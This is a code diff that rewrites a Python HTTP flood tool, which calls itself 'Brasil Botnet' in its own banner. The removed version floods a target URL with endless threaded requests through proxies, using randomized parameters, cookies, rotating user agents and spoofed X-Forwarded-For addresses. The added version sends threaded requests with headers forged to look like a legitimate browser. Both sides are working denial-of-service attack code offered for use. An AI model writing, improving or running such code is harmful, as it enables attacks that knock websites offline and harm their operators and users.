@@ -1,88 +1,63 @@
-import urllib.request
-import sys
+import requests
 import threading
-import random
-import re
 import time
-import http.cookiejar
-import uuid
+import sys
+import random
 
-def load_proxies():
-    with open('proxies.txt', 'r') as file:
-        return [line.strip() for line in file]
+def load_file_contents(file_path):
+    with open(file_path, 'r') as file:
+        return [line.strip() for line in file.readlines()]
 
-def useragent_list():
-    with open('useragents.txt', 'r') as f:
-        return [line.strip() for line in f]
-
-def referer_list(host):
-    with open('referers.txt', 'r') as f:
-        headers_referers = [line.strip() for line in f]
-    headers_referers.append('http://' + host + '/')
-    return headers_referers
-
-def buildblock(size):
-    return ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(size))
-
-def generate_cookie():
-    return "session=" + uuid.uuid4().hex
-
-def httpcall(url, proxy, headers_useragents, headers_referers):
-    cookie_jar = http.cookiejar.CookieJar()
-    proxy_support = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
-    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar), proxy_support)
-    urllib.request.install_opener(opener)
-    if url.count("?") > 0:
-        param_joiner = "&"
-    else:
-        param_joiner = "?"
-    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
-    request.add_header('User-Agent', random.choice(headers_useragents))
-    request.add_header('Cache-Control', 'no-cache')
-    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
-    request.add_header('Keep-Alive', random.randint(110, 120))
-    request.add_header('Connection', 'keep-alive')
-    request.add_header('Cookie', generate_cookie())
-    request.add_header('X-Requested-With', 'XMLHttpRequest')
-    request.add_header('DNT', '1')
-    request.add_header('X-Forwarded-For', str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)))
-    host = re.search('(https?://)?([^/]*)/?.*', url).group(2)
-    request.add_header('Host', host)
-    time.sleep(random.uniform(0.1, 2))
+def keep_request_alive(url, duration, user_agents, referers):
+    # Selecionando um user-agent e um referer aleatórios
+    user_agent = random.choice(user_agents)
+    referer = random.choice(referers)
+    
+    # Definindo os cabeçalhos HTTP para simular um navegador de usuário legítimo
+    headers = {
+        'User-Agent': user_agent,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Referer': referer,
+        'Connection': 'keep-alive',
+        'DNT': '1',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-User': '?1',
+        'Sec-Fetch-Dest': 'document'
+    }
+    
     try:
-        urllib.request.urlopen(request)
-    except Exception as e:
-        pass
+        # Realizando a solicitação GET com os cabeçalhos definidos
+        response = requests.get(url, headers=headers, timeout=duration)
+        # Mantendo a solicitação pelo período especificado
+        time.sleep(duration)
+        print(f"Resposta {response.status_code} de {url} com headers {headers}")
+    except requests.exceptions.RequestException as e:
+        print(f"Erro: {e}")
 
-class HTTPThread(threading.Thread):
-    def __init__(self, url, proxy, headers_useragents, headers_referers):
-        threading.Thread.__init__(self)
-        self.url = url
-        self.proxy = proxy
-        self.headers_useragents = headers_useragents
-        self.headers_referers = headers_referers
-    def run(self):
-        while True:
-            httpcall(self.url, self.proxy, self.headers_useragents, self.headers_referers)
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("Uso: python script.py <url> <duration> <threads>")
+        sys.exit(1)
 
-if __name__ == '__main__':
-    if len(sys.argv) < 3:
-        print("Botnet Brasil created per Seyzalel.")
-        print('Usage: python app.py <url> <threads>')
-        sys.exit()
     url = sys.argv[1]
-    threads_count = int(sys.argv[2])
-    print("\nBrasil Botnet attack sent successfully!")
-    print("Created per Seyzalel Menabel.")
-    print(f"Target: {url}")
-    print(f"Threads: {threads_count}")
-    print("Duration: Infinite Loop")
-    print("\nTodos os direitos desta Botnet são reservados a Seyzalel Menabel, sua utilização e distribuição sem consentimento explícito são estritamente proibidos.\n")
-    proxies = load_proxies()
-    headers_useragents = useragent_list()
-    headers_referers = referer_list(re.search('(https?://)?([^/]*)/?.*', url).group(2))
-    for i in range(threads_count):
-        proxy = random.choice(proxies)
-        t = HTTPThread(url, proxy, headers_useragents, headers_referers)
-        t.start()
+    duration = int(sys.argv[2])
+    thread_count = int(sys.argv[3])
+
+    user_agents = load_file_contents("useragents.txt")
+    referers = load_file_contents("referers.txt")
+
+    threads = []
+    for _ in range(thread_count):
+        thread = threading.Thread(target=keep_request_alive, args=(url, duration, user_agents, referers))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
+    print("Todas as solicitações foram completadas.")
